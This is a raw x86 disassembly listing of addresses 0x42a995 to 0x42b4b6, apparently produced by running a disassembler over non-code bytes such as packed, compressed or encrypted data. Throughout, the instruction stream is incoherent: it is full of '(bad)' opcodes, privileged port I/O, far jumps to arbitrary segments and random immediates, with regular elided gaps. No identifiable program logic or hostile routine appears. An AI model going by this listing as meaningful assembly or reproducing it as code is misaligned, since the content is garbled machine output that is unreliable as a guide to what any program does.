  42a995:	sbb    al,0x99
  42a997:	or     dh,BYTE PTR [ebp-0x51]
  42a99a:	daa    
  42a99b:	add    ebp,edx
  42a99d:	inc    ebp
  42a99e:	add    eax,ebx
  42a9a0:	adc    bl,cl
  42a9a2:	add    ecx,DWORD PTR [eax]
  42a9a4:	xor    bl,cl
  42a9a6:	jle    0x42a990
  42a9a8:	inc    eax
  42a9a9:	add    al,0xeb
  42a9ab:	xor    eax,0x6b942935
  42a9b0:	sti    
  42a9b1:	in     eax,dx
  42a9b2:	jmp    0x7a850334
  42a9b7:	add    bl,BYTE PTR [edx-0x17]
  42a9ba:	or     BYTE PTR [ebx],cl
  42a9bc:	ins    DWORD PTR es:[edi],dx
  42a9bd:	ret    0x721b
  42a9c0:	(bad)  
  42a9c1:	jns    0x42a9c3
	...
  42aa33:	add    dh,cl
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	jecxz  0x42aa25
  42aa42:	cwde   
  42aa43:	pop    ebp
  42aa44:	jl     0x42aa0a
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	test   BYTE PTR [eax],0x0
  42aa4b:	add    BYTE PTR [ebp-0x1b80f557],bh
  42aa51:	push   ebp
  42aa52:	cli    
  42aa53:	pop    esi
  42aa54:	addr16 sub ebx,ecx
  42aa57:	inc    esi
  42aa58:	in     eax,0x63
  42aa5a:	adc    esp,DWORD PTR [esi+0x6886f393]
  42aa60:	(bad)
  42aa63:	in     eax,dx
  42aa64:	push   ds
  42aa65:	mov    eax,ds:0xa35c6435
  42aa6a:	sub    DWORD PTR [ebx-0x2bc59664],ebx
  42aa70:	fisttp DWORD PTR [esi]
  42aa72:	rcr    DWORD PTR [esi-0x5e],1
  42aa75:	fisub  DWORD PTR [edi-0x25]
  42aa78:	and    ebp,eax
  42aa7a:	cmp    bh,BYTE PTR [eax]
  42aa7c:	jno    0x42aae9
  42aa7e:	aad    0x50
  42aa80:	mov    ecx,0xdbd93f70
  42aa85:	(bad)  
  42aa86:	leave  
  42aa87:	sbb    DWORD PTR [ecx-0x34],edi
  42aa8a:	add    dl,ah
  42aa8c:	adc    eax,0x8ac1fb80
  42aa91:	mov    ah,0xf8
  42aa93:	das    
  42aa94:	sub    bl,bl
  42aa96:	pusha  
  42aa97:	inc    ebp
  42aa98:	hlt    
  42aa99:	adc    al,0x1b
  42aa9b:	xchg   esi,eax
  42aa9c:	push   ds
  42aa9d:	ss js  0x42aac9
  42aaa0:	jp     0x42ab17
  42aaa2:	retw   0x26ff
  42aaa6:	sar    dl,1
  42aaa8:	aas    
  42aaa9:	mov    BYTE PTR [esi-0x1d],cl
  42aaac:	mov    BYTE PTR [esi+0x2e426cfb],0x71
  42aab3:	fisttp WORD PTR [ebx+0x2f496844]
  42aab9:	inc    esi
  42aaba:	sbb    BYTE PTR ds:0xb0709f5,al
  42aac0:	pop    es
  42aac1:	out    0xa5,eax
  42aac3:	cmc    
  42aac4:	ins    BYTE PTR es:[edi],dx
  42aac5:	loope  0x42aad1
  42aac7:	dec    esi
  42aac8:	push   ds
  42aac9:	and    BYTE PTR [ecx+ecx*1-0x55e83f3d],ch
  42aad0:	clc    
  42aad1:	xor    BYTE PTR [edi-0x2e59bad2],dl
  42aad7:	xchg   ebp,eax
  42aad8:	jecxz  0x42ab4b
  42aada:	inc    ebx
  42aadb:	add    edi,DWORD PTR [ecx]
  42aadd:	arpl   WORD PTR [edi+0x74],bp
  42aae0:	mov    DWORD PTR [eax+ecx*4],esp
  42aae3:	xlat   BYTE PTR ds:[ebx]
  42aae4:	jp     0x42ab44
  42aae6:	mov    eax,ds:0xdec9db8f
  42aaeb:	pop    esp
  42aaec:	aaa    
  42aaed:	inc    edx
  42aaee:	loop   0x42ab44
  42aaf0:	fwait
  42aaf1:	inc    eax
  42aaf2:	ja     0x42ab28
  42aaf4:	jae    0x42aaf2
  42aaf6:	or     BYTE PTR [edi-0x11183cea],ch
  42aafc:	imul   eax,DWORD PTR [ecx+0x6d],0xafdd9dd
  42ab03:	xor    al,0x48
  42ab05:	ret    
  42ab06:	fcmove st,st(6)
  42ab08:	push   0x7a69222e
  42ab0d:	lea    edx,[ebx+0x3a0db63c]
  42ab13:	call   0xe284:0xab0c3c1f
  42ab1a:	out    0x50,eax
  42ab1c:	jne    0x42ab52
  42ab1e:	(bad)  
  42ab1f:	iret   
  42ab20:	loope  0x42ab70
  42ab22:	pop    ss
  42ab23:	xor    BYTE PTR [esi-0x3d],dh
  42ab26:	call   0xeea6afc2
  42ab2b:	sbb    BYTE PTR [esi+eiz*1+0x4a],bh
  42ab2f:	pop    edx
  42ab30:	xchg   edi,eax
  42ab31:	out    0x46,eax
  42ab33:	aad    0x5b
  42ab35:	hlt    
  42ab36:	jbe    0x42aad7
  42ab38:	push   eax
  42ab39:	cdq    
  42ab3a:	das    
  42ab3b:	ret    
  42ab3c:	pop    ds
  42ab3d:	int    0x74
  42ab3f:	fpatan 
  42ab41:	inc    ebp
	...
  42abb2:	add    BYTE PTR [eax],al
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	stos   DWORD PTR es:[edi],eax
  42abc1:	rol    DWORD PTR [ecx+0x1c57207],1
  42abc7:	add    dh,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    bh,bh
  42abcd:	cs out dx,al
  42abcf:	arpl   WORD PTR [esi-0x960d206],ax
  42abd5:	add    cl,BYTE PTR ds:0x749dd164
  42abdb:	mov    dh,0x47
  42abdd:	and    BYTE PTR [edi+0x4d92039e],dh
  42abe3:	call   0x870d:0x116240be
  42abea:	or     esp,DWORD PTR [ebp-0x41]
  42abed:	dec    ecx
  42abee:	and    eax,0xa96fe612
  42abf3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42abf5:	je     0x42abc5
  42abf7:	push   ecx
  42abf8:	repz cli 
  42abfa:	add    al,0xd
  42abfc:	lahf   
  42abfd:	inc    ecx
  42abfe:	or     ebp,DWORD PTR [ecx+0x26855d7e]
  42ac04:	pop    es
  42ac05:	hlt    
  42ac06:	jno    0x42abd4
  42ac08:	les    esi,FWORD PTR [ebx-0x31582fb9]
  42ac0e:	das    
  42ac0f:	call   0x57087288
  42ac14:	retf   
  42ac15:	push   ebx
  42ac16:	les    ecx,FWORD PTR [edi-0x3385a809]
  42ac1c:	mov    ecx,0xee5abab3
  42ac21:	push   ebp
  42ac22:	inc    esi
  42ac23:	push   esp
  42ac24:	ret    0x1f46
  42ac27:	es dec ecx
  42ac29:	adc    edx,DWORD PTR [ebp-0x62]
  42ac2c:	std    
  42ac2d:	jmp    0xca46:0x62e68a6b
  42ac34:	stos   DWORD PTR es:[edi],eax
  42ac35:	push   edi
  42ac36:	and    DWORD PTR [ebp+0x6027ac68],ebx
  42ac3c:	adc    eax,0x78200bdb
  42ac41:	repz sub esp,esi
  42ac44:	cmp    DWORD PTR [ebx+0xb],ebx
  42ac47:	cmp    al,0xa
  42ac49:	scas   al,BYTE PTR es:[edi]
  42ac4a:	loopne 0x42ac80
  42ac4c:	sahf   
  42ac4d:	(bad)  
  42ac4e:	inc    esi
  42ac4f:	jae    0x42ac92
  42ac51:	xchg   esp,eax
  42ac52:	xlat   BYTE PTR ds:[ebx]
  42ac53:	add    BYTE PTR [edx-0x2cae53ed],al
  42ac59:	push   eax
  42ac5a:	mov    ebx,0x52c6cef8
  42ac5f:	sbb    DWORD PTR [edx+0x8],ecx
  42ac62:	aaa    
  42ac63:	pop    es
  42ac64:	shl    DWORD PTR [ebp-0x4d094d67],cl
  42ac6a:	scas   al,BYTE PTR es:[edi]
  42ac6b:	xchg   ecx,eax
  42ac6c:	les    ebp,FWORD PTR [ecx+ebx*4+0x2cd1e47]
  42ac73:	mov    BYTE PTR [ecx-0x2fb30b1c],dl
  42ac79:	dec    eax
  42ac7a:	fist   DWORD PTR [esp+ebx*8+0x2f]
  42ac7e:	(bad)  
  42ac7f:	mov    edi,0xa8e68fbc
  42ac84:	and    BYTE PTR [edi+0x5c94e80f],ah
  42ac8a:	mov    edi,0xda78119d
  42ac8f:	shl    BYTE PTR [esp+ebx*1-0x26],0x9f
  42ac94:	add    BYTE PTR [edx-0x2e99d25f],dl
  42ac9a:	lds    ebx,FWORD PTR [ebx]
  42ac9c:	mov    eax,0xe29682ed
  42aca1:	cs lahf 
  42aca3:	pop    edx
  42aca4:	aaa    
  42aca5:	fld    QWORD PTR [edi-0x29e14e1e]
  42acab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42acac:	das    
  42acad:	jno    0x42ad05
  42acaf:	fstp   TBYTE PTR [eax-0x2e]
  42acb2:	and    eax,0x785d5234
  42acb7:	jnp    0x42ac54
  42acb9:	jmp    0x42ad04
  42acbb:	iret   
  42acbc:	je     0x42ad3a
  42acbe:	outs   dx,BYTE PTR ds:[esi]
  42acbf:	inc    ecx
  42acc0:	adc    cl,BYTE PTR [ebx]
	...
  42ad32:	add    BYTE PTR [eax],al
  42ad34:	fwait
  42ad35:	mov    bh,0xc4
  42ad37:	or     al,0xec
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	(bad)  
  42ad41:	pushf  
  42ad42:	push   0xfffffffe
  42ad44:	push   0xf60001c6
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    BYTE PTR [eax],bl
  42ad4d:	jmp    0x42ad5c
  42ad4f:	pushf  
  42ad50:	ins    DWORD PTR es:[edi],dx
  42ad51:	fld    DWORD PTR [ebp-0x28]
  42ad54:	in     eax,dx
  42ad55:	fnsave cs:[edi+0x420527be]
  42ad5c:	push   cs
  42ad5d:	add    bh,ch
  42ad5f:	jle    0x42ad7c
  42ad61:	(bad)  
  42ad63:	pop    edx
  42ad64:	xlat   BYTE PTR ds:[ebx]
  42ad65:	push   es
  42ad66:	mov    edx,0xc5918c27
  42ad6b:	stos   BYTE PTR es:[edi],al
  42ad6c:	jmp    0xade0:0x798e60da
  42ad73:	sbb    al,0xc
  42ad75:	mov    dh,0x5f
  42ad77:	out    0xa6,al
  42ad79:	dec    ebx
  42ad7a:	jmp    0x4867:0x762473d1
  42ad81:	dec    ebx
  42ad82:	xchg   ecx,eax
  42ad83:	mov    al,ds:0x93d04b08
  42ad88:	mov    edi,?
  42ad8a:	xchg   BYTE PTR [edx],bl
  42ad8c:	dec    ebp
  42ad8d:	pop    edx
  42ad8e:	(bad)  
  42ad8f:	(bad)  [esi-0x48]
  42ad92:	inc    esp
  42ad93:	xchg   ebp,eax
  42ad94:	dec    esp
  42ad95:	and    eax,0x7c8984bb
  42ad9a:	es aam 0x10
  42ad9d:	addr16 pop ebx
  42ad9f:	and    al,ch
  42ada1:	test   BYTE PTR [edi+0x6a],al
  42ada4:	imul   esp,DWORD PTR [ebp+0x41],0x5d7f0f0
  42adab:	rcr    dh,1
  42adad:	xchg   ebx,eax
  42adae:	iret   
  42adaf:	pop    eax
  42adb0:	ror    BYTE PTR [edx+0x62],0x1b
  42adb4:	(bad)
  42adb7:	bound  ebx,QWORD PTR [eax-0x13f4d115]
  42adbd:	push   esi
  42adbe:	int    0x50
  42adc0:	sahf   
  42adc1:	mov    dl,0x69
  42adc3:	jge    0x42adfd
  42adc5:	ins    DWORD PTR es:[edi],dx
  42adc6:	jl     0x42ae0a
  42adc8:	cli    
  42adc9:	sbb    al,0xa6
  42adcb:	dec    esi
  42adcc:	stc    
  42adcd:	adc    eax,0x7b1e9da1
  42add2:	das    
  42add3:	stos   BYTE PTR es:[edi],al
  42add4:	mov    eax,0xea0e6f8e
  42add9:	and    DWORD PTR [edi+0x69],edi
  42addc:	mov    al,0x9d
  42adde:	ja     0x42ad9b
  42ade0:	sub    esi,DWORD PTR [esi+eax*2+0x32]
  42ade4:	xchg   ecx,eax
  42ade5:	jmp    DWORD PTR [edi-0x40]
  42ade8:	std    
  42ade9:	mov    eax,ebp
  42adeb:	adc    ah,cl
  42aded:	stos   BYTE PTR es:[edi],al
  42adee:	xchg   ecx,eax
  42adef:	lea    esp,[esi+0x1984e364]
  42adf5:	dec    edx
  42adf6:	mov    eax,ds:0x7b579ad5
  42adfb:	sub    DWORD PTR [eax+0x77],ebx
  42adfe:	add    eax,0x6e1aab2
  42ae03:	rcr    BYTE PTR [esi-0x6db40bc5],1
  42ae09:	stc    
  42ae0a:	mov    cl,0xe6
  42ae0c:	cmp    ebp,ebx
  42ae0e:	xchg   ecx,eax
  42ae0f:	sub    BYTE PTR [esp+eiz*2+0x9],cl
  42ae13:	stos   DWORD PTR es:[edi],eax
  42ae14:	enter  0x8ed,0xbd
  42ae18:	lahf   
  42ae19:	test   eax,0xb2172351
  42ae1e:	out    dx,al
  42ae1f:	push   es
  42ae20:	sbb    eax,0x1a56a32e
  42ae25:	(bad)  
  42ae26:	push   eax
  42ae27:	sbb    al,0xa3
  42ae29:	loope  0x42aded
  42ae2b:	bound  edx,QWORD PTR ds:0x688d47eb
  42ae31:	test   al,0xf5
  42ae33:	leave  
  42ae34:	dec    ebp
  42ae35:	sbb    BYTE PTR [ebx+0x1ff043e8],dl
  42ae3b:	scas   al,BYTE PTR es:[edi]
  42ae3c:	mov    bh,0x90
  42ae3e:	idiv   BYTE PTR fs:[edx]
  42ae41:	lock add BYTE PTR [eax],al
	...
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	dec    eax
  42aec1:	pop    ebp
  42aec2:	adc    BYTE PTR [esi+ebx*2-0x9fffe39],al
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    BYTE PTR [eax-0x64],dh
  42aece:	ficomp WORD PTR [eax+0x31]
  42aed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aed2:	adc    esp,DWORD PTR ds:[ecx+0x6b]
  42aed6:	nop
  42aed7:	sub    BYTE PTR [esi],ah
  42aed9:	ret    0x5291
  42aedc:	bound  ebp,QWORD PTR [ebx-0x320afa49]
  42aee2:	mov    dl,0xa3
  42aee4:	push   0xffffffe4
  42aee6:	in     eax,0x67
  42aee8:	icebp  
  42aee9:	jno    0x42aec5
  42aeeb:	cmp    eax,DWORD PTR [ebx-0xe]
  42aeee:	fidivr DWORD PTR [ebx-0x36]
  42aef1:	sar    edi,1
  42aef3:	sbb    eax,DWORD PTR ds:0xb1803664
  42aef9:	cwde   
  42aefa:	push   cs
  42aefb:	or     dl,cl
  42aefd:	inc    ecx
  42aefe:	push   ss
  42aeff:	jecxz  0x42aeab
  42af01:	push   DWORD PTR [eax*2-0x3d387a97]
  42af08:	(bad)  
  42af09:	inc    edx
  42af0a:	fcomp  QWORD PTR [edx]
  42af0c:	sub    edx,DWORD PTR [edx-0x4a9bc4bd]
  42af12:	aaa    
  42af13:	inc    edi
  42af14:	popf   
  42af15:	and    dl,BYTE PTR [ecx+0x694237b2]
  42af1b:	pop    ss
  42af1c:	test   DWORD PTR [edx+0x42cfa44e],ebp
  42af22:	(bad)  
  42af23:	sbb    eax,0x43247479
  42af28:	pop    esi
  42af29:	mov    ch,0x66
  42af2b:	sbb    eax,0x55105173
  42af30:	das    
  42af31:	adc    edx,DWORD PTR [ebp-0x47]
  42af34:	and    eax,0x59effe7f
  42af39:	int    0xb0
  42af3b:	js     0x42af67
  42af3d:	test   eax,0x91a0e82a
  42af42:	leave  
  42af43:	or     BYTE PTR [ebx-0x19],0x31
  42af47:	add    dh,0xaa
  42af4a:	dec    edx
  42af4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af4c:	jns    0x42af1d
  42af4e:	loop   0x42af62
  42af50:	test   eax,0xdfff2be9
  42af55:	lea    edx,[edi]
  42af57:	call   DWORD PTR [edi+0x6b9d81ee]
  42af5d:	xlat   BYTE PTR ds:[ebx]
  42af5e:	dec    ebp
  42af5f:	(bad)  
  42af60:	repz jb 0x42afcd
  42af63:	push   edi
  42af64:	out    dx,al
  42af65:	xor    al,0x81
  42af67:	sbb    BYTE PTR [esi+0x418ab238],al
  42af6d:	mov    ds:0x3e100239,eax
  42af72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af73:	cdq    
  42af74:	inc    edi
  42af75:	xchg   edx,eax
  42af76:	ret    0xce82
  42af79:	xor    ebp,ebx
  42af7b:	not    ecx
  42af7d:	popf   
  42af7e:	xlat   BYTE PTR ds:[ebx]
  42af7f:	push   es
  42af80:	(bad)  
  42af81:	jnp    0x42afe3
  42af83:	nop
  42af84:	xor    BYTE PTR [esi],ah
  42af86:	fcom   QWORD PTR [edi]
  42af88:	pop    esi
  42af89:	mov    bl,0xdc
  42af8b:	pop    ss
  42af8c:	and    al,0x81
  42af8e:	enter  0x6b1d,0x88
  42af92:	lea    eax,[edx]
  42af94:	cmp    eax,0x46a5d9b4
  42af99:	jae    0x42afac
  42af9b:	push   DWORD PTR [edi+ebp*1-0x11ea180a]
  42afa2:	xchg   ecx,eax
  42afa3:	out    0xc,al
  42afa5:	call   0x630b:0xe4bba72f
  42afac:	retf   
  42afad:	jno    0xe84682cd
  42afb3:	pop    edx
  42afb4:	pop    edx
  42afb5:	popf   
  42afb6:	fst    DWORD PTR [edx]
  42afb8:	repz in eax,0x1c
  42afbb:	xor    DWORD PTR [edx],ecx
  42afbd:	gs mov edi,0x175c8
	...
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x41f5
  42b042:	push   ss
  42b043:	stos   DWORD PTR es:[edi],eax
  42b044:	push   esp
  42b045:	enter  0x1,0xf6
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [esi+0x30],ch
  42b04e:	xchg   esi,eax
  42b04f:	mov    WORD PTR [esi],?
  42b051:	imul   esi,DWORD PTR [ecx+0x38583ad0],0xe3060fce
  42b05b:	fnstenv [eax]
  42b05d:	jecxz  0x42aff9
  42b05f:	mov    eax,0xc3d673b9
  42b064:	mov    ebp,0x214deaf3
  42b069:	push   esi
  42b06a:	jb     0x42b0cd
  42b06c:	xchg   ecx,eax
  42b06d:	or     ch,BYTE PTR [edx-0x6f]
  42b070:	jg     0x42affb
  42b072:	clc    
  42b073:	xor    al,0xcc
  42b075:	dec    esp
  42b076:	jmp    0xdc7b:0x77b341f0
  42b07d:	mov    bh,0xb0
  42b07f:	fidivr DWORD PTR [eax-0x55]
  42b082:	in     al,0x3
  42b084:	adc    ebx,0xf736fcea
  42b08a:	dec    esi
  42b08b:	dec    eax
  42b08c:	popf   
  42b08d:	xor    DWORD PTR [edx+0x24],esi
  42b090:	stos   DWORD PTR es:[edi],eax
  42b091:	jmp    0x6d49:0x40d10770
  42b098:	and    eax,DWORD PTR ds:0xecd8161d
  42b09e:	fsub   DWORD PTR [edi-0x15]
  42b0a1:	retf   
  42b0a2:	lahf   
  42b0a3:	mov    bl,0x19
  42b0a5:	sbb    BYTE PTR [edi+edi*4-0x44],al
  42b0a9:	or     BYTE PTR [edx],0x5f
  42b0ac:	push   eax
  42b0ad:	out    0xdb,eax
  42b0af:	dec    ebp
  42b0b0:	xchg   edx,eax
  42b0b1:	imul   edi,DWORD PTR [esi+0x48],0xb80d8a75
  42b0b8:	xor    DWORD PTR [ecx-0x571e93cc],0x9493609c
  42b0c2:	jle    0x42b070
  42b0c4:	bound  esp,QWORD PTR [edx]
  42b0c6:	pop    ebp
  42b0c7:	mov    dl,0x60
  42b0c9:	(bad)  
  42b0ca:	(bad)  
  42b0cb:	mov    ebp,0xbab8cd31
  42b0d0:	retf   0x4ca7
  42b0d3:	pop    ebx
  42b0d4:	lods   eax,DWORD PTR ds:[esi]
  42b0d5:	bound  esp,QWORD PTR [edx-0x70]
  42b0d8:	mov    edi,0x3f9b4db7
  42b0dd:	xor    al,0x5d
  42b0df:	mov    ah,0xe6
  42b0e1:	test   DWORD PTR [ebx+0x79],esi
  42b0e4:	dec    ecx
  42b0e5:	adc    ah,BYTE PTR [ebp-0x76e1296a]
  42b0eb:	test   eax,0x9dbf29a1
  42b0f0:	lea    esi,[ebp-0x1b124ba5]
  42b0f6:	ss mov dh,0xd8
  42b0f9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0fc:	(bad)  
  42b0fd:	push   0x346ea3b5
  42b102:	popf   
  42b103:	add    dh,dl
  42b105:	xor    eax,0x166af4fb
  42b10a:	adc    DWORD PTR [ebx],ebp
  42b10c:	mov    eax,ds:0xdf89f363
  42b111:	cmc    
  42b112:	push   esp
  42b113:	int    0xa9
  42b115:	adc    eax,0xc7991c49
  42b11a:	jnp    0x42b0a2
  42b11c:	pop    eax
  42b11d:	ror    BYTE PTR [ebx],cl
  42b11f:	div    bl
  42b121:	fcom   DWORD PTR [edx+0x34440f97]
  42b127:	xor    bh,BYTE PTR [ecx]
  42b129:	aaa    
  42b12a:	push   0x15182273
  42b12f:	cli    
  42b130:	shr    BYTE PTR ds:0x962637e9,0xad
  42b137:	xchg   esp,eax
  42b138:	sbb    cl,dl
  42b13a:	pop    esp
  42b13b:	mov    eax,ds:0x6d95c47d
  42b140:	mov    dh,0x5b
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	inc    esp
  42b1c1:	mov    bl,0xd
  42b1c3:	xchg   esp,eax
  42b1c4:	dec    edx
  42b1c5:	leave  
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	test   BYTE PTR [eax],0x0
  42b1cb:	add    BYTE PTR ds:0x9794cba5,cl
  42b1d1:	(bad)  
  42b1d2:	mov    BYTE PTR [edx],bh
  42b1d4:	mov    dl,0x30
  42b1d6:	nop
  42b1d7:	xlat   BYTE PTR ds:[ebx]
  42b1d8:	jnp    0x42b1c9
  42b1da:	loope  0x42b1eb
  42b1dc:	sub    edx,0xffffffa6
  42b1df:	xchg   esi,eax
  42b1e1:	int3   
  42b1e2:	outs   dx,BYTE PTR ds:[esi]
  42b1e3:	and    eax,esp
  42b1e5:	cmp    bl,BYTE PTR [ecx]
  42b1e7:	mov    WORD PTR [eax+ecx*1+0x7b],ds
  42b1eb:	stc    
  42b1ec:	push   esp
  42b1ed:	and    esi,DWORD PTR ds:0x7ea81cf0
  42b1f3:	mov    ecx,0xd43f7d62
  42b1f8:	mov    eax,ds:0xba869c59
  42b1fd:	jp     0x42b23b
  42b1ff:	outs   dx,DWORD PTR ds:[esi]
  42b200:	and    BYTE PTR [edi+ebp*1],cl
  42b203:	mov    al,0x21
  42b205:	and    al,bl
  42b207:	xor    eax,0x537b13c3
  42b20c:	fsub   st(0),st
  42b20e:	pop    esp
  42b20f:	frstor ds:[ecx+0x7e669485]
  42b216:	inc    ebp
  42b217:	sbb    BYTE PTR [esi-0x567c8bde],cl
  42b21d:	shr    BYTE PTR [esi+0x608f786d],1
  42b223:	int    0x81
  42b225:	push   edx
  42b226:	ficom  WORD PTR [eax]
  42b228:	or     DWORD PTR [esi-0x4b],edx
  42b22b:	mov    eax,0x53314eb2
  42b230:	popf   
  42b231:	adc    eax,0x7e8925a9
  42b236:	sub    dh,dl
  42b238:	(bad)  
  42b239:	out    dx,eax
  42b23a:	popa   
  42b23b:	(bad)  
  42b23c:	int3   
  42b23d:	sti    
  42b23e:	sbb    eax,0xffffffd8
  42b241:	add    esi,edx
  42b243:	dec    ebx
  42b244:	mov    edi,0x79a5f7f4
  42b249:	and    eax,0x15807374
  42b24e:	out    0x71,eax
  42b250:	xchg   dh,ch
  42b252:	pushf  
  42b253:	arpl   WORD PTR [ecx-0x14dad250],dx
  42b259:	(bad)  
  42b25a:	push   0xffffff9b
  42b25c:	js     0x42b222
  42b25e:	cmp    DWORD PTR [esi],ecx
  42b260:	push   ecx
  42b261:	dec    ebx
  42b262:	xchg   ecx,eax
  42b263:	sub    bl,BYTE PTR [ebx*8-0x16ad1f55]
  42b26a:	adc    BYTE PTR [edi+0x144ecc0b],cl
  42b270:	test   DWORD PTR [eax],esi
  42b272:	shl    BYTE PTR [ebx],0xb
  42b275:	xor    edx,DWORD PTR [edx]
  42b277:	jmp    0xba8e:0xc0befd68
  42b27e:	aad    0xf
  42b280:	sub    al,0x55
  42b282:	inc    eax
  42b283:	pop    ds
  42b284:	sar    DWORD PTR [ebx+0x52d185bb],cl
  42b28a:	push   ds
  42b28b:	mov    ebx,0xe4e84f96
  42b290:	mov    esi,0x3923e119
  42b295:	xchg   edx,eax
  42b296:	xlat   BYTE PTR ds:[ebx]
  42b297:	mov    esp,0xa03f7977
  42b29c:	sub    bl,BYTE PTR [esi+0x4372a4bc]
  42b2a2:	cmp    esp,DWORD PTR [esi-0x39efb3f0]
  42b2a8:	mov    edx,0xc3f9b54c
  42b2ad:	icebp  
  42b2ae:	mov    ebp,DWORD PTR [ebx-0x32]
  42b2b1:	push   ebp
  42b2b2:	pop    ds
  42b2b3:	push   esi
  42b2b4:	lods   al,BYTE PTR ds:[esi]
  42b2b5:	cli    
  42b2b6:	xchg   edx,eax
  42b2b7:	ds jb  0x42b266
  42b2ba:	test   eax,0x789cedba
  42b2bf:	jmp    0x42f62e
	...
  42b334:	jg     0x42b344
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax+0x5e],esi
  42b341:	into   
  42b342:	adc    DWORD PTR [edx+0x1ca40],eax
  42b348:	test   BYTE PTR [eax],0x0
  42b34b:	add    BYTE PTR [eax+ebp*8+0x34],cl
  42b34f:	retf   0xebc
  42b352:	sub    eax,0x8d067a0c
  42b357:	mov    edx,0xbd5643d5
  42b35c:	ficom  WORD PTR [ecx+0x11f54fca]
  42b362:	mov    ds:0x37e7d07f,eax
  42b367:	pushf  
  42b368:	mov    eax,ds:0xc503af6e
  42b36d:	fsubp  st(3),st
  42b36f:	push   0x10
  42b371:	push   ss
  42b372:	cs cmp al,0x3d
  42b375:	fisub  DWORD PTR ds:0x3bb17cf0
  42b37b:	mov    BYTE PTR [edx],ch
  42b37d:	xor    BYTE PTR [eax+0x31],ch
  42b380:	add    al,0x92
  42b382:	or     ecx,esi
  42b384:	cmp    eax,0xa39a6b0
  42b389:	lods   al,BYTE PTR ds:[esi]
  42b38a:	fcom   st(5)
  42b38c:	int3   
  42b38d:	repnz push 0x59a8134
  42b393:	(bad)  
  42b394:	cmp    al,0x57
  42b396:	add    al,0x42
  42b398:	xchg   ecx,eax
  42b399:	jp     0x42b33f
  42b39b:	repnz xchg esi,eax
  42b39d:	fwait
  42b39e:	add    DWORD PTR [edx+0x1de62774],esi
  42b3a4:	push   ebp
  42b3a5:	add    eax,0x888f9179
  42b3aa:	jno    0x42b3a7
  42b3ac:	cld    
  42b3ad:	cmp    eax,0x51c998a5
  42b3b2:	and    BYTE PTR [edi],0xc7
  42b3b5:	jo     0x42b382
  42b3b7:	mov    al,0x18
  42b3b9:	pop    cx
  42b3bb:	add    al,0x7d
  42b3bd:	mov    ebp,0xe380fc44
  42b3c2:	popf   
  42b3c3:	jl     0x42b3c2
  42b3c5:	cmp    cl,BYTE PTR [esi+0x26]
  42b3c8:	mov    bl,0xe0
  42b3ca:	add    edx,DWORD PTR [esi+0x45]
  42b3cd:	sub    ah,bl
  42b3cf:	mov    ds:0x53446da8,al
  42b3d4:	sub    al,0x6
  42b3d6:	inc    edi
  42b3d7:	dec    ebx
  42b3d8:	mov    esp,0xe6796ecb
  42b3dd:	int3   
  42b3de:	clc    
  42b3df:	xor    BYTE PTR [edi],dh
  42b3e1:	jne    0x42b457
  42b3e3:	push   ss
  42b3e4:	sub    eax,0x93c0004f
  42b3e9:	lea    eax,ds:0xd7592e71
  42b3ef:	sub    al,BYTE PTR [ebp-0x23]
  42b3f2:	jns    0x42b41d
  42b3f4:	jg     0x42b3a7
  42b3f6:	cmp    eax,0xb449a6f2
  42b3fb:	xor    ebp,DWORD PTR [ebp+0x7d]
  42b3fe:	scas   eax,DWORD PTR es:[edi]
  42b3ff:	add    eax,esp
  42b401:	xor    dh,BYTE PTR [eax-0x734b42e6]
  42b407:	data16 cld 
  42b409:	pop    esi
  42b40a:	inc    esp
  42b40b:	sub    cl,BYTE PTR [eax]
  42b40d:	call   0xb00743ca
  42b412:	push   esi
  42b413:	sub    eax,0xb11e038
  42b418:	mov    ebx,0x460a3c18
  42b41d:	ja     0x42b436
  42b41f:	jne    0x42b428
  42b421:	lahf   
  42b422:	pop    es
  42b423:	add    al,0xc3
  42b425:	xchg   BYTE PTR [eax],cl
  42b427:	mov    ecx,0x1698b42d
  42b42c:	retfw  0x7ce9
  42b430:	inc    ebx
  42b431:	inc    esi
  42b432:	imul   edx,DWORD PTR [ecx+ecx*2],0xffffff83
  42b436:	xchg   edx,eax
  42b437:	jp     0x42b4aa
  42b439:	jge    0x42b445
  42b43b:	adc    ecx,DWORD PTR [edx-0x5]
  42b43e:	jle    0x42b471
  42b440:	pop    edx
  42b441:	xor    BYTE PTR [eax],al
	...
  42b4b3:	add    BYTE PTR [eax],bl
  42b4b5:	dec    edi
  42b4b6:	pop    ss
